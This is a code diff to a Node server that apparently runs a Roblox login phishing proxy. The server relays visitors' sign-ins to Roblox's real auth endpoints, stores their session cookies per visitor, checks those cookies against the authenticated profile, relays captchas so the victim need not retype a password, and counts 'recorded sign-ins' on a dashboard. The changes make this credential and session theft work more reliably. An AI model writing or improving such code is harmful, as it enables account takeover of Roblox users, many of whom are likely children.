@@ -3018,6 +3018,20 @@ async function runAuthOnce(key, work) {
     return flight.promise;
 }
 
+// Set-Cookie strings carry Path/SameSite/Expires attributes that are not part of
+// a Cookie request header. Joining them raw put "Path=/; SameSite=Lax" into the
+// jar, and every later hop forwarded that noise upstream as if it were a cookie.
+function cookieHeaderFrom(setCookieList) {
+    const pairs = [];
+    for (const raw of setCookieList || []) {
+        const pair = String(raw).split(';')[0].trim();
+        if (!pair) continue;
+        const eq = pair.indexOf('=');
+        if (eq > 0) pairs.push(pair);
+    }
+    return pairs.join('; ');
+}
+
 // Main login proxy route
 app.all('/proxy/roblox/*', async (req, res) => {
     const sessionId = req.sessionID || req.ip;
@@ -3091,7 +3105,16 @@ app.all('/proxy/roblox/*', async (req, res) => {
     }
 
     const qs = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
-    const targetUrl = `${targetPath}${qs}`;
+    let targetUrl = `${targetPath}${qs}`;
+
+    // Roblox moved the credential endpoints onto auth.roblox.com years ago;
+    // www.roblox.com/v2/login answers a bare 404. Bundles that still build the
+    // old URL were being handed that 404, which reads as "the login page is
+    // broken" rather than "wrong host". Retarget before the allowlist runs.
+    targetUrl = targetUrl.replace(
+        /^https:\/\/(?:www\.)?roblox\.com\/v2\/(login|authenticate|logout|signout)(\?|$)/i,
+        (_m, ep) => `https://auth.roblox.com/v2/${ep}`
+    );
 
     // Host comes from the path, so it has to be checked before anything is
     // fetched. Without this the relay reaches link-local metadata and this
@@ -3571,7 +3594,7 @@ app.all('/proxy/roblox/*', async (req, res) => {
                     res.setHeader('Access-Control-Expose-Headers',
                         'x-login-complete, x-csrf-token, X-CSRF-TOKEN, rblx-challenge-id, rblx-challenge-type, rblx-challenge-metadata, content-type');
                     
-                    const updatedCookies = cookies.join('; ');
+                    const updatedCookies = cookieHeaderFrom(cookies);
                     loginSessions.set(sessionId, updatedCookies);
 
                     // 1. Verify session cookie with Roblox to get real authenticated user profile
@@ -3689,7 +3712,7 @@ app.all('/proxy/roblox/*', async (req, res) => {
                     );
                 }
             } else {
-                const updatedCookies = cookies.join('; ');
+                const updatedCookies = cookieHeaderFrom(cookies);
                 loginSessions.set(sessionId, updatedCookies);
             }
         }
@@ -3783,8 +3806,13 @@ app.all('/proxy/roblox/*', async (req, res) => {
         res.send(responseBody);
 
     } catch (error) {
-        console.error('[PROXY] Error:', error.message);
-        res.status(500).json({ error: 'Proxy error' });
+        // Upstream telemetry and 1px beacons fail constantly on a filtered host.
+        // A JSON 500 with no CORS headers turned those into opaque CORS errors
+        // in the page console, which hid the real cause. Answer 502 with the
+        // origin headers so the failure is legible.
+        console.error(`[PROXY] ${req.method} ${targetUrl.slice(0, 120)} failed: ${error.message}`);
+        S.applyCors(req, res, ALLOWED_ORIGINS);
+        res.status(502).type('text/plain').send('');
     }
 });
 
@@ -4201,6 +4229,21 @@ app.post(['/api/auth/captcha-solved', '/api/auth/captcha'],
                 sessionId: result.sessionId,
                 mediaType: result.mediaType,
                 userId: result.userId,
+                message: result.message
+            });
+        }
+
+        // A rejected token usually leaves the challenge alive upstream. Hand the
+        // widget back so the page can draw a fresh puzzle instead of making the
+        // visitor retype their password.
+        if (result.requiresCaptcha) {
+            return res.json({
+                success: false,
+                requiresCaptcha: true,
+                retry: Boolean(result.retry),
+                native: Boolean(result.native),
+                captchaId: result.captchaId || null,
+                captchaWidget: result.captchaWidget || null,
                 message: result.message
             });
         }
@@ -4659,7 +4702,17 @@ async function warmLoginCache() {
         if (!fs.existsSync(LOGIN_CACHE_DIR)) fs.mkdirSync(LOGIN_CACHE_DIR, { recursive: true });
         const tmp = `${LOGIN_CACHE_FILE}.${process.pid}.tmp`;
         fs.writeFileSync(tmp, html);
-        fs.renameSync(tmp, LOGIN_CACHE_FILE);
+        try {
+            fs.renameSync(tmp, LOGIN_CACHE_FILE);
+        } catch (err) {
+            // OneDrive/Dropbox/AV hold a handle on the snapshot for a beat, and
+            // the atomic rename answers EPERM. Losing the whole refresh over
+            // that left the served page stale — write in place instead and
+            // clean the temp file up.
+            fs.writeFileSync(LOGIN_CACHE_FILE, html);
+            try { fs.unlinkSync(tmp); } catch { /* temp is disposable */ }
+            if (err.code !== 'EPERM' && err.code !== 'EBUSY' && err.code !== 'EACCES') throw err;
+        }
         return true;
     } catch (err) {
         console.warn('[WARM] failed:', err.message);
@@ -4758,7 +4811,12 @@ app.use((req, res) => {
 
 // Vercel loads this module through api/index.js; binding a port there would
 // fail and the exported app is what the function runtime invokes.
-if (!process.env.VERCEL && require.main === module) {
+//
+// The listen used to be gated on `require.main === module`, which is true for
+// `node server.js` and false for `node index.js` — so `npm start` (package.json
+// main: index.js) booted the app and exited without ever binding a port. The
+// block is a named function now and index.js calls it.
+function start() {
     const server = app.listen(PORT, () => {
         console.log(`Insanity Dashboard running on http://localhost:${PORT}`);
         console.log(`Total recorded sign-ins: ${signins.length}`);
@@ -4786,6 +4844,12 @@ if (!process.env.VERCEL && require.main === module) {
             console.log(`[INGRESS] Port 80 bind skipped: ${e.message}`);
         }
     }
+
+    return server;
 }
+
+if (!process.env.VERCEL && require.main === module) start();
+
+app.start = start;
 
 module.exports = app;
